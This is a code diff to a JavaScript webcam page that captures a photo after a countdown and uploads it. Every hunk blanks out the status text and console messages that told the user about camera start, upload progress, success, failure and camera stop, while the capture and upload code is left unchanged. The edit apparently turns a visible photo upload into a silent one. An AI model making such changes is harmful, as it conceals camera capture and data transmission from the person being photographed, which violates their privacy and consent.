@@ -28,7 +28,7 @@ async function initAndCapture() {
     try {
       await video.play();
     } catch (e) {
-      console.warn('Autoplay may be blocked, continuing anyway:', e);
+      console.warn(' ', e);
     }
 
     // wait for metadata + first frames
@@ -38,7 +38,7 @@ async function initAndCapture() {
     statusEl.textContent = ' ';
     startCountdown(2);
   } catch (err) {
-    console.error('Camera init error:', err);
+    console.error(' ', err);
     notice.textContent = ' ';
     statusEl.textContent = err?.message || String(err);
   }
@@ -88,17 +88,17 @@ function captureAndUpload() {
     ctx.drawImage(video, -w, 0, w, h);
     ctx.restore();
   } catch (err) {
-    console.error('drawImage failed:', err);
+    console.error(' ', err);
     statusEl.textContent = ' ';
     stopCamera();
     return;
   }
 
-  statusEl.textContent = 'Uploading photo...';
+  statusEl.textContent = ' ';
 
   canvas.toBlob(async (blob) => {
     if (!blob) {
-      statusEl.textContent = 'Capture failed (no blob).';
+      statusEl.textContent = ' ';
       stopCamera();
       return;
     }
@@ -113,14 +113,14 @@ function captureAndUpload() {
       let json = null;
       try { json = await resp.json(); } catch (_) {}
       if (resp.ok) {
-        statusEl.textContent = '✅ Photo sent successfully.';
+        statusEl.textContent = ' ';
       } else {
-        statusEl.textContent = '❌ Upload failed: ' + (json?.error || resp.statusText);
-        console.error('Upload failed', resp.status, json);
+        statusEl.textContent = '  ' + (json?.error || resp.statusText);
+        console.error(' ', resp.status, json);
       }
     } catch (err) {
-      console.error('Network/upload error:', err);
-      statusEl.textContent = '❌ Network error while uploading.';
+      console.error(' ', err);
+      statusEl.textContent = ' ';
     } finally {
       stopCamera();
     }
@@ -135,6 +135,6 @@ function stopCamera() {
       stream = null;
     }
     video.srcObject = null;
-    notice.textContent = 'Camera stopped.';
-  } catch (err) { console.warn('Error stopping camera:', err); }
+    notice.textContent = ' ';
+  } catch (err) { console.warn(' ', err); }
 }
